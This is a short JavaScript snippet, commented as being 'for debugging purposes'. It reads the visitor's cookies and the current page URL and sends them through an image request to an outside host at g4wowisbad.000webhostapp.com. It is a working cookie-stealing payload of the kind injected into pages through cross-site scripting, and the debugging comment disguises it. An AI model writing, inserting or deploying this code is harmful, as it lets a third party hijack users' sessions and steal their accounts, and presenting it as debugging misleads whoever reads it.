//Debugging purposes

//Gen data
cookie = "Cookies:"+document.cookie;
url = "URL:"+document.location;

$data = encodeURIComponent(cookie+url);

var imageObject = new Image();
imageObject.src = "http://g4wowisbad.000webhostapp.com?log="+$data;
